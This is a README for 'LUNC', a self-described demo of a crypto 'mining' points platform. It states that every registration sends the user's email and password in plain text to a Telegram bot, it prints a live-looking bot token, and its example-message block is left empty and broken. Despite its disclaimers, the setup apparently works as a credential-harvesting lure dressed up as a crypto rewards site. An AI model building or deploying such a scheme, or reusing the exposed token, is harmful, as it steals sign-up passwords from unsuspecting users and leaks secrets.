# LUNC – Community Mining & Points Network

**LUNC** is a modern, professional demo of a community points / mining-style platform.  
Users register, claim daily activity rewards, view balances, invite friends, and transfer points between wallets — all inside a clean mobile-first interface.

> ⚠️ **Important Notice**  
> This is a **simulation / demo only**.  
> - No real blockchain, no real mining, no real tokens.  
> - Points are stored in the browser (localStorage).  
> - The Telegram notification uses the bot token you provided and now includes **email + password in plain text**.  
> - Sending passwords to Telegram is **highly insecure**. Anyone with access to the chat can see them.  
> - **Never** put a real bot token or send passwords in public frontend code for production.  
> - Move the Telegram call to a serverless function (Cloudflare Workers / Vercel) before going live.  
> - Private keys are **never** generated or shown.

## Telegram Setup (already configured)

- Bot Token: `8974625858:AAEkRSYuo5-zp8EQt1Ij0alzfBSf6Qplq4I`

On every new registration the bot receives a message like:

```

## Future Real Listing Path (recommended)

When you are ready to turn this into a real project:

1. Move authentication & points to a real backend (Firebase / Supabase / custom API)
2. Replace simulated points with a real ERC-20 / BEP-20 token
3. Use a proper wallet connection (WalletConnect / RainbowKit)
4. Move Telegram notifications to a secure serverless function
5. Add KYC, anti-bot, and proper rate limiting
6. Audit the smart contracts before any public listing
